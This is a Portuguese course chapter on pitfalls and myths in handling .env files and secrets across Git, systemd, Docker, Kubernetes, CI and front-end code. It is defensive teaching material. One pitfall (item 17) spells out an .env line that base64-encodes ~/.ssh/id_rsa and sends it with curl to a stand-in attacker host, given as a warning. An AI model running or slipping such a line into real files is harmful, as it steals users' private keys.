# 75 · Armadilhas, mitos e más práticas

`Nível: todos` · `Atualizado em: 14/08/2026`

30 armadilhas e 10 mitos. Cada armadilha traz **o sintoma**, **a causa** e **a correção**.

---

## Parte I — Armadilhas

### Git e repositório

**1. `.gitignore` não protege arquivo já rastreado.**
*Sintoma:* você adicionou `.env` ao `.gitignore` e ele continua aparecendo em
`git status`.
*Causa:* o `.gitignore` só afeta arquivos **não rastreados**.
*Correção:* `git rm --cached .env` (mantém o arquivo em disco). E lembre-se de que o
histórico anterior **continua com o segredo** — ver [50](50-vazamentos-e-resposta.md).

**2. `git rm --cached` não apaga do histórico.**
Remove do próximo commit, não do passado. `git show HEAD~1:.env` ainda mostra tudo.

**3. `.dockerignore` esquecido.**
`COPY . .` leva o `.env` **e o `.git` inteiro** para dentro da imagem.
*Correção:* `.dockerignore` com `.env`, `.env.*`, `.git`, `secrets/`.

**4. `.env.production` versionado.**
O nome parece legítimo e engana o revisor de código. Se tem segredo, é a mesma coisa
que commitar o `.env`, com disfarce.

**5. Arquivo de exemplo com valor real.**
Alguém preenche o `.env.example` "para facilitar" e commita. O
[projeto-modelo](07-projeto-modelo/test/config.test.mjs) tem um teste automatizado
contra isso.

### Formato e parsing

**6. `#` sem aspas trunca o valor.**
`SENHA=abc#123` vira `abc` em Node e continua `abc#123` em Python — **medido** em
[12](12-formato-dotenv.md).

**7. Expansão `${VAR}` não é universal.**
Funciona em `python-dotenv` e `phpdotenv`; **não** funciona no `--env-file` do Node.

**8. CRLF invisível.**
Arquivo salvo no Windows: a senha ganha um `\r` no fim e é recusada sem explicação.
*Diagnóstico:* `file .env`. *Correção:* `dos2unix .env`.

**9. Espaço no fim do valor.**
*Diagnóstico:* `printenv SENHA | cat -A` — o `$` marca o fim da linha.

**10. Aspas viram parte do valor.**
`SENHA='"abc"'` no shell, ou aspas duplicadas entre arquivo e comando.

### Tipos

**11. `Boolean("false") === true`.**
A armadilha mais universal. Em Python, `bool("false")` também é `True`.
*Correção:* compare com a string: `x === 'true'`.

**12. `Number("") === 0`.**
`PORT=` (vazio) vira porta 0, que em `listen()` significa "escolha qualquer porta
livre". O serviço sobe numa porta aleatória, saudável para o health check e invisível
para o balanceador. *Correção:* trate string vazia como **ausente**.

**13. Número lido como string.**
`process.env.PORT + 1` dá `"30001"`, não `3001`.

### Carregamento

**14. `dotenv` importado depois de quem precisa dele.**
Em ESM, todos os `import` executam antes, na ordem. *Correção:* `--env-file`.

**15. `.env` não encontrado por causa do diretório de trabalho.**
As bibliotecas procuram no **cwd**, não ao lado do arquivo de código.

**16. `override: true`.**
Faz o `.env` vencer o ambiente — e então um arquivo esquecido no servidor **derruba a
configuração de produção**. Praticamente nunca é o que você quer.

**17. `source .env` executa o arquivo.**
`API_KEY=$(curl atacante.com?d=$(cat ~/.ssh/id_rsa|base64))` roda de verdade.
Nunca dê `source` num `.env` de terceiro.

### Servidor e sistema

**18. `~/.bashrc` não é lido por systemd nem por cron.**
"Funciona quando eu rodo à mão" é sempre isto.

**19. Mudar o `EnvironmentFile` sem reiniciar não faz nada.**
O ambiente é copiado no `execve` ([10-fundamentos.md](10-fundamentos.md)).

**20. `Environment=` na unit do systemd vaza.**
Aparece em `systemctl show`, e a unit é `644`.

**21. Permissão 644 no `.env` do servidor.**
Qualquer usuário do servidor lê. Em hospedagem compartilhada: os outros clientes.

**22. `.env` dentro do diretório servido pela web.**
`https://site/.env` devolve 200. *Teste:*
`curl -s -o /dev/null -w '%{http_code}' https://seusite/.env`.

**23. Reinício em loop com configuração errada.**
Sem `RestartPreventExitStatus=78`, o systemd reinicia a cada 5 s para sempre e enche
o disco de log.

### Contêiner e nuvem

**24. `ENV SEGREDO=x` no Dockerfile.**
Fica na camada, para sempre, em toda cópia da imagem. `RUN rm` não apaga.

**25. `--build-arg` para segredo.**
Aparece em `docker history`. *Correção:* `--mount=type=secret` do BuildKit.

**26. Secret do Kubernetes achando que é criptografia.**
É base64. Sem `EncryptionConfiguration` com **KMS v2**, está legível no etcd e em
todo backup dele.

**27. Secret do K8s como variável de ambiente quando precisa rotacionar.**
Montado como volume, o kubelet atualiza sozinho; como variável, exige recriar o pod.

**28. Buscar do cofre a cada requisição.**
Estoura custo (US$ 0,05 por 10.000 chamadas na AWS) e limite de vazão.
*Correção:* cache com TTL, carregado na inicialização.

### CI/CD e front-end

**29. `pull_request_target` com checkout do código do fork.**
Qualquer pessoa abre um PR com `postinstall` malicioso e leva seus segredos.

**30. Segredo em `NEXT_PUBLIC_` / `VITE_` / `REACT_APP_`.**
Vai embutido no JavaScript entregue ao navegador. Não existe segredo no front-end.

---

## Parte II — Mitos

**Mito 1 — "É repositório privado, então pode commitar o `.env`."**
❌ Todos os colaboradores atuais **e passados** têm acesso; está nos clones locais
deles e nos backups. Repositórios ficam públicos por engano com frequência
desconfortável. E, quando a empresa for vendida ou auditada, alguém vai ler.

**Mito 2 — "Apaguei do Git, resolvido."**
❌ Está no histórico, nos forks, nos clones, nos caches do servidor de hospedagem.
**A única resposta é rotacionar.**

**Mito 3 — "Base64 protege."**
❌ Base64 é codificação, não criptografia. `base64 -d` desfaz em um comando.

**Mito 4 — "Ofuscar o JavaScript protege a chave."**
❌ Teoricamente impossível ([60 §6.1](60-teoria-avancada.md)). Aumenta o custo do
atacante em minutos.

**Mito 5 — "Variável de ambiente é mais segura que arquivo."**
❌ **É o contrário.** Variável aparece em `/proc/PID/environ`, em `docker inspect`,
é herdada por todo subprocesso e vaza em relatório de crash. Arquivo com permissão
restrita é mais seguro — daí o padrão `_FILE`.

**Mito 6 — "Preciso de um cofre para estar seguro."**
❌ Para 1–3 servidores e uma equipe pequena, `systemd LoadCredential` com
`chmod 640` é **suficiente e correto**. Um cofre mal operado — que fica selado às 3h
da manhã e leva alguém a copiar os segredos para um arquivo temporário — é **pior**
que um arquivo bem operado.

**Mito 7 — "Rotacionar a cada 90 dias é sempre a boa prática."**
🟡 O NIST desaconselha rotação periódica forçada **para senhas humanas**. Para
credencial de máquina o raciocínio é outro ([45 §5](45-rotacao-e-ciclo-de-vida.md)).
"Sempre" é o que está errado na frase.

**Mito 8 — "Se está criptografado no Git, posso versionar tranquilo."**
🟡 Sim para transporte; **não** para revogação. Quem já clonou e tinha a chave lê o
histórico para sempre. `sops updatekeys` não muda isso.

**Mito 9 — "O provedor de nuvem cuida da segurança."**
🟡 Modelo de responsabilidade compartilhada: ele cuida **da** nuvem, você cuida
**na** nuvem. Um bucket público, uma role OIDC com `StringLike "repo:*"` ou uma
chave estática vazada são responsabilidade sua.

**Mito 10 — "Segredo em memória está seguro."**
🟡 `/proc/PID/mem`, despejos de núcleo, hibernação e o hipervisor. Strings imutáveis
em JS e Python não podem ser apagadas de forma confiável. Mitigável, não eliminável —
exceto com enclave.

---

## Parte III — Os cinco erros que mais custam caro

Em ordem de prejuízo observado no mercado:

| # | Erro | Prejuízo típico |
|---|---|---|
| 1 | Chave de nuvem em repositório público | milhares de dólares em horas (mineração), acesso total à conta |
| 2 | `APP_DEBUG=true` / `DEBUG=True` em produção | o `.env` inteiro exposto a qualquer visitante |
| 3 | `.env` acessível por HTTP | idem, e há varredores testando continuamente |
| 4 | Segredo em `NEXT_PUBLIC_`/`VITE_` | chave de pagamento pública; abuso na sua conta |
| 5 | Sem inventário, sem rotação | um incidente que ninguém sabe dimensionar nem conter |

**Os cinco são baratos de prevenir e caros de remediar.** Se você fizer só cinco
coisas depois deste curso, faça estas: `.gitignore` + gitleaks; `DEBUG=false`;
`curl https://seusite/.env`; `grep` no `dist/`; e uma planilha de inventário.

---

## Autoteste

1. Por que `.gitignore` não resolve um `.env` já rastreado, e qual comando resolve?
2. Por que "variável de ambiente é mais segura que arquivo" é um mito? Cite três razões.
3. Em que situação `Number("")` derruba um serviço de forma silenciosa?
4. Por que `override: true` no carregador de `.env` é perigoso em produção?
5. Por que `RUN rm segredo.txt` num Dockerfile não apaga o segredo?
6. Por que um cofre mal operado pode ser pior que um arquivo bem operado?
7. Qual é a única resposta correta a um segredo vazado, e por que as outras não bastam?
8. Por que `sops updatekeys` não revoga o acesso de um ex-colega?
9. O que significa "responsabilidade compartilhada" na nuvem, na prática?
10. Liste os cinco erros mais caros e o custo de prevenir cada um.

---

**Próximo:** [80-custos-e-licencas.md](80-custos-e-licencas.md) · Voltar ao [mapa](00-MAPA.md)
